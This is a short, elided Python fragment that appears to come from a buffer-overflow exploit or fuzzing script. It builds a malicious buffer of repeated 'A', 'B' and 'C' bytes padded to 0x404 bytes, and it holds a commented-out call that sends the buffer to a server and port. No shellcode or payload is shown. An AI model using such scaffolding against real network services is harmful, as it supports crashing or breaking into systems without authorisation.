...
def main():
    ...
    #     sendMalBuff(buf, (server, port), DEBUG_Response=True)
        ...
        # psCommandBuffer
        buf += repeat_bytes("A", 0x100)
        buf += repeat_bytes("B", 0x100)
        buf += repeat_bytes("C", 0x100)

        # Padding
        paddingLen = 0x404 - len(buf)
        buf += repeat_bytes("PADDING_", paddingLen)
